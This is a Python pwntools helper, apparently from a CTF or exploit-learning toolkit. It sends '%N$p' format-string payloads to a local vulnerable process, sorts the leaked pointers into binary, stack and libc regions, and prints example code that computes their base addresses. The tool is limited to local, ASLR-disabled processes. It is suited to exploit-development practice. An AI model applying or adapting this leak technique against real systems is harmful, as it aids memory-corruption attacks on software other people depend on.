from pwn import *

from formal_pledge.getlibc import get_libc_start_in_process
from formal_pledge.leak_regions import *

# bits = 32 or = 64
def get_region(addr, bits, proc):
    addr_d = addr & differ_mask[bits]
    libc_start = get_libc_start_in_process(proc) 
    libc_start_d = libc_start & differ_mask[bits]

    if libc_start_d <= addr_d <= libc_start_d:
        return 'libc', addr - libc_start 
    if stack_start_d[bits] <= addr_d <= stack_end_d[bits]:
        return 'stack', addr - stack_start[bits]
    if binary_start_d[bits] <= addr_d <= binary_start_d[bits]: # yes start twice
        return 'bin', addr - binary_start[bits]
    return 'none', 0

def print_locations(loc_struct):
    if len(loc_struct) == 0:
        print('[NONE FOUND]')
        return
    for x in loc_struct:
        if loc_struct.index(x) >= 7:
            print('[SNIP]...')
            return
        print(f"({x[0]}, {hex(x[1])})")

def leak(fmt_exec_function, elff, max_distance=100):
    saved_log_level = context.log_level
    context.log_level = 'critical'
    
    test_payload = b'NY4AA~'
    testout, testp = fmt_exec_function(test_payload)

    # this check could be circumvented by reading /proc/<pid>/maps
    if testp.aslr:
        print('Run the process with ASLR off please.\np = process(["./vuln"], aslr=False)')
        return
    
    if not isinstance(testp, process) or isinstance(testp, remote):
        print('The process cannot be remote.\np = process(["./vuln"], aslr=False)') 
        return

    reflect_start = testout.find(test_payload)
    if reflect_start == -1:
        print('Cannot see the input in the output')
        return

    if get_libc_start_in_process(testp) == 0:
        print('Couldnt find location of LIBC in process')
        return
    testp.close()

    context.log_level = 'critical' # since context gets cleared in calculate_offsets()
    context.arch = elff.arch

    binary_loc = []
    stack_loc = []
    libc_loc = []

    for i in range(1, max_distance + 1):
        output, p = fmt_exec_function(f'%{i}$p.SSSSS.LLLLL.END'.encode('ascii'))
        if isinstance(output, str):
            output = output.encode('ascii')
        output = output[reflect_start:]
        reflect_end = output.find(b'END')
        if reflect_end == -1:
            print('Cannot see END in the output')
            return
        output = output[:reflect_end].split(b'.')[0]
        
        address = 0
        try:
            address = int(output, 16)
        except:
            continue

        region, r_offset = get_region(address, elff.bits, p)

        match region:
            case 'bin':
                binary_loc.append((i, r_offset))
            case 'stack':
                stack_loc.append((i, r_offset))
            case 'libc':
                libc_loc.append((i, r_offset))
        p.close()

    print('Leaking binary:\n(STRING OFFSET, REGION OFFSET)')
    print_locations(binary_loc)
    print('\nLeaking stack:\n(STRING OFFSET, REGION OFFSET)')
    print_locations(stack_loc)
    print('\nLeaking LIBC:\n(STRING OFFSET, REGION OFFSET)')
    print_locations(libc_loc)

    print('\n(Format string used was of structure: %7$p.SSSSS.LLLLL.END)')

    if len(binary_loc) > 0 and len(stack_loc) > 0 and len(libc_loc) > 0:
        print('Leak Code Example:')
        print(f"""
format_string = b'%{binary_loc[0][0]}$p.%{stack_loc[0][0]}$p.%{libc_loc[0][0]}$p.END'\n\
p.sendline(format_string)
returned = p.recvline()
leaks = returned[{reflect_start}:returned.find(b'END')].split(b'.')
elff.address = leaks[0] - {hex(binary_loc[0][1])}
stack = leaks[1] - {hex(stack_loc[0][1])}
libc.address = leaks[2] - {hex(libc_loc[0][1])}
print('binary: ', hex(elff.address))
print('stack: ', hex(stack))
print('libc: ', hex(libc.address))""")

    context.log_level = saved_log_level